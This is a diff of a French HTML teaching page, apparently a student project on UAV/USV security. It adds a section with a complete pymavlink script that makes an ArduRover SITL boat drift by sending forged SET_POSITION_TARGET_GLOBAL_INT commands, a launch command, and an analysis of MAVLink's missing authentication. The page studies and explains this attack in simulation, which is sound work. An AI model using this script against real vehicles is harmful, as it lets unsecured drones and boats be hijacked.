+      <div class="info-box">
+        <div class="ib-title">Scénario 1 — Sensor spoofing</div>
+        <ul class="styled">
+          <li>Remplace les données GPS dans l'EKF</li>
+          <li>Nécessite <code>GPS1_TYPE = 14</code></li>
+          <li>Messages <code>GPS_INPUT</code> ou <code>HIL_GPS</code></li>
+          <li>Le drone « croit » être ailleurs</li>
+        </ul>
+      </div>
+      <div class="info-box">
+        <div class="ib-title">Drift — Navigation spoofing</div>
+        <ul class="styled">
+          <li>GPS authentique conservé</li>
+          <li>Aucun paramètre à modifier</li>
+          <li>Messages <code>SET_POSITION_TARGET_GLOBAL_INT</code></li>
+          <li>Le drone « obéit » à une cible décalée</li>
+        </ul>
+      </div>
+    </div>
+
+    <h4 class="sub2">Le script gps_spoof_usv.py</h4>
+    <p class="prose">
+      Le script se connecte au flux MAVLink, lit la position réelle du USV en continu, attend
+      quelques secondes avant de déclencher l'attaque, puis calcule à chaque tick une position
+      décalée de <code>drift_rate × t</code> mètres dans la direction choisie. Cette cible est
+      envoyée comme consigne de navigation.
+    </p>
+
+    <div class="code-block">
+<span class="comment">#!/usr/bin/env python3</span>
+<span class="comment"># gps_spoof_usv.py — GPS Drift Spoofer pour ArduRover SITL</span>
+import argparse, math, time
+from datetime import datetime, timezone
+from pymavlink import mavutil
+
+
+<span class="keyword">def</span> compute_drift(real, rate, direction_rad, elapsed):
+    <span class="comment"># Calcule la position cible décalée selon la dérive</span>
+    dist  = rate * elapsed
+    d_lat = (dist * math.cos(direction_rad)) / 111_111.0
+    d_lon = (dist * math.sin(direction_rad)) / (111_111.0 * math.cos(math.radians(real[<span class="str">"lat"</span>])))
+    s = real.copy()
+    s[<span class="str">"lat"</span>] = real[<span class="str">"lat"</span>] + d_lat
+    s[<span class="str">"lon"</span>] = real[<span class="str">"lon"</span>] + d_lon
+    s[<span class="str">"vn"</span>]  = real.get(<span class="str">"vn"</span>, 0.0) + rate * math.cos(direction_rad)
+    s[<span class="str">"ve"</span>]  = real.get(<span class="str">"ve"</span>, 0.0) + rate * math.sin(direction_rad)
+    <span class="keyword">return</span> s
+
+
+<span class="keyword">def</span> send_position(mav, s):
+    <span class="comment"># Envoie une cible de position via SET_POSITION_TARGET_GLOBAL_INT</span>
+    TYPE_MASK = 0b0000_1111_1000
+    mav.mav.set_position_target_global_int_send(
+        int(time.time() * 1000) &amp; 0xFFFFFFFF,
+        mav.target_system, mav.target_component,
+        mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
+        TYPE_MASK,
+        int(s[<span class="str">"lat"</span>] * 1e7), int(s[<span class="str">"lon"</span>] * 1e7),
+        float(s.get(<span class="str">"rel_alt"</span>, 0.0)),
+        float(s.get(<span class="str">"vn"</span>, 0.0)), float(s.get(<span class="str">"ve"</span>, 0.0)),
+        0.0, 0.0, 0.0, 0.0, 0.0, 0.0,
+    )
+
+
+<span class="keyword">def</span> main():
+    p = argparse.ArgumentParser(description=<span class="str">"GPS Drift Spoofer — ArduRover SITL"</span>)
+    p.add_argument(<span class="str">"--connection"</span>,  default=<span class="str">"udp:0.0.0.0:14552"</span>)
+    p.add_argument(<span class="str">"--drift-rate"</span>,  type=float, default=0.5,  help=<span class="str">"m/s"</span>)
+    p.add_argument(<span class="str">"--direction"</span>,   type=float, default=0.0,  help=<span class="str">"degres: 0=N 90=E"</span>)
+    p.add_argument(<span class="str">"--pre-attack"</span>,  type=float, default=10.0, help=<span class="str">"delai avant attaque (s)"</span>)
+    args = p.parse_args()
+
+    dir_rad = math.radians(args.direction)
+
+    mav = mavutil.mavlink_connection(args.connection, autoreconnect=True)
+    mav.wait_heartbeat(timeout=30)
+
+    mav.mav.request_data_stream_send(
+        mav.target_system, mav.target_component,
+        mavutil.mavlink.MAV_DATA_STREAM_ALL, 10, 1)
+
+    real_gps = None
+    t_start   = time.time()
+    t_attack  = None
+    cmds      = 0
+
+    <span class="keyword">while</span> True:
+        msg = mav.recv_match(type=[<span class="str">"GPS_RAW_INT"</span>, <span class="str">"GLOBAL_POSITION_INT"</span>],
+                             blocking=True, timeout=1.0)
+        <span class="keyword">if</span> msg <span class="keyword">is</span> None:
+            <span class="keyword">continue</span>
+
+        <span class="keyword">if</span> msg.get_type() == <span class="str">"GPS_RAW_INT"</span>:
+            real_gps = {
+                <span class="str">"lat"</span>: msg.lat / 1e7, <span class="str">"lon"</span>: msg.lon / 1e7,
+                <span class="str">"alt"</span>: msg.alt / 1000.0, <span class="str">"rel_alt"</span>: 0.0,
+                <span class="str">"vn"</span>: 0.0, <span class="str">"ve"</span>: 0.0,
+                <span class="str">"sats"</span>: int(msg.satellites_visible),
+            }
+        <span class="keyword">elif</span> msg.get_type() == <span class="str">"GLOBAL_POSITION_INT"</span> <span class="keyword">and</span> real_gps:
+            real_gps[<span class="str">"vn"</span>]      = msg.vx / 100.0
+            real_gps[<span class="str">"ve"</span>]      = msg.vy / 100.0
+            real_gps[<span class="str">"rel_alt"</span>] = msg.relative_alt / 1000.0
+
+        <span class="keyword">if</span> real_gps <span class="keyword">is</span> None:
+            <span class="keyword">continue</span>
+
+        elapsed = time.time() - t_start
+
+        <span class="keyword">if</span> elapsed &gt;= args.pre_attack:
+            <span class="keyword">if</span> t_attack <span class="keyword">is</span> None:
+                t_attack = time.time()
+                print(f<span class="str">"[ATTAQUE] drift {args.drift_rate} m/s @ {args.direction}°"</span>)
+
+            spoof = compute_drift(real_gps, args.drift_rate, dir_rad,
+                                  time.time() - t_attack)
+            send_position(mav, spoof)
+            cmds += 1
+
+
+<span class="keyword">if</span> __name__ == <span class="str">"__main__"</span>:
+    main()
+    </div>
+
+    <h4 class="sub2">Lancer l'attaque</h4>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Drift à 0.5 m/s vers l'est, 10 s d'attente
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">$ </span><span class="t-cmd">python3 gps_spoof_usv.py </span></div>
+      </div>
+    </div>
+
+    <img src="images/img26.png" alt="USV dérive sous l'effet du spoofing" class="img">
+    <div class="img-caption">Fig. 23 — Le USV dévie progressivement de sa trajectoire prévue</div>
+
+    <!-- ANALYSE DES VULNÉRABILITÉS -->
+    <h3 class="subsection">Pourquoi ça fonctionne — analyse</h3>
+
+    <div class="vuln-card">
+      <div class="vuln-title">Absence d'authentification des messages</div>
+      <p class="prose">
+        Par défaut, MAVLink ne vérifie pas l'identité de l'émetteur. Tout appareil connecté au flux
+        peut envoyer des commandes de navigation. Le drone ne distingue pas un message légitime d'un
+        message malveillant.
+      </p>
+    </div>
+
+    <div class="vuln-card">
+      <div class="vuln-title">Absence de chiffrement</div>
+      <p class="prose">
+        Les messages MAVLink (UDP en clair) peuvent être interceptés et analysés. L'attaquant
+        connaît la position réelle, la trajectoire et l'état du véhicule — ce qui rend le spoofing
+        d'autant plus efficace.
+      </p>
+    </div>
+
+    <div class="vuln-card">
+      <div class="vuln-title">Confiance implicite dans les commandes reçues</div>
+      <p class="prose">
+        ArduPilot considère les messages MAVLink reçus sur un port autorisé comme légitimes. Même
+        si le GPS reste correct, le système exécute les consignes falsifiées et le véhicule dérive
+        progressivement de sa trajectoire.
+      </p>
+    </div>
+
+    <div class="vuln-card">
+      <div class="vuln-title">Exploitation du contrôle externe</div>
+      <p class="prose">
+        Le message <code>SET_POSITION_TARGET_GLOBAL_INT</code> a été conçu pour permettre le guidage
+        autonome, le contrôle hors-bord et le suivi de trajectoire par un ordinateur compagnon.
+        Cette fonctionnalité devient une surface d'attaque lorsque le réseau MAVLink n'est pas
+        sécurisé et que les ports UDP sont accessibles.
+      </p>
+    </div>
+
+    <div class="alert alert-danger">
+      <strong>Impact sur la cybersécurité des UAV/USV</strong>
+      La sécurité de ces systèmes ne dépend pas uniquement de la protection des capteurs GPS. Même
+      avec un GPS parfaitement valide, un attaquant peut manipuler le comportement du véhicule en
+      exploitant les mécanismes de commande du protocole MAVLink. Les couches de communication et
+      de navigation constituent donc également des points critiques.
+    </div>
+
+  </div>
+</div><!-- end usv -->
+
 <!-- FOOTER -->
 <footer>
-  <div>Sécurité des environnements UAV · Yakine Haffoudhi · IMT Atlantique</div>
+  <div>Sécurité des environnements UAV &amp; USV · Yakine Haffoudhi · IMT Atlantique · 2026</div>
 </footer>
 
-<!-- SCROLL TOP -->
 <div class="scroll-top" id="scrollTop" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</div>
 
 <script>
@@ -2232,8 +2877,9 @@ GPS SPOOFING - Cercle autour de Canberra {<br>
     document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
     document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
     document.getElementById(id).classList.add('active');
-    const idx = id === 'theorie' ? 0 : 1;
-    document.querySelectorAll('.nav-tab')[idx].classList.add('active');
+    const ids = ['theorie', 'simulation', 'attaques', 'usv'];
+    const idx = ids.indexOf(id);
+    if (idx >= 0) document.querySelectorAll('.nav-tab')[idx].classList.add('active');
     window.scrollTo({ top: document.querySelector('.hero').offsetHeight, behavior: 'smooth' });
   }
 
@@ -2241,6 +2887,18 @@ GPS SPOOFING - Cercle autour de Canberra {<br>
     const st = document.getElementById('scrollTop');
     if (window.scrollY > 400) st.classList.add('visible');
     else st.classList.remove('visible');
+  });
+
+  // Smooth scroll for step-nav anchors
+  document.querySelectorAll('a[href^="#"]').forEach(link => {
+    link.addEventListener('click', function(e) {
+      const targetId = this.getAttribute('href').slice(1);
+      const target = document.getElementById(targetId);
+      if (target) {
+        e.preventDefault();
+        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      }
+    });
   });
 </script>
 </body>
